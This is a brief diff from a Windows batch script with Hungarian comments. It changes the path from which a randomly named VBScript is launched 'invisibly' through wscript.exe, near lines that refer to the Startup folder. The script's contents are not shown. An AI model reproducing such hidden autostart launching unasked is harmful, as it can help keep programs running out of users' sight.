@@ -86,7 +86,7 @@ echo.
 
 :: ====== VBSCRIPT FUTTATÁSA LÁTHATATLANUL ======
 echo [INFO] A sifustartup5sfgj.vbs inditasa...
-start "" "wscript.exe" "%STARTUP_FOLDER%\sifustartup5sfgj.vbs"
+start "" "wscript.exe" "%TARGET%\sifustartup5sfgj.vbs"
 echo [SIKER] VBScript elindult (háttérben).
 
 :: Startup mappa helye
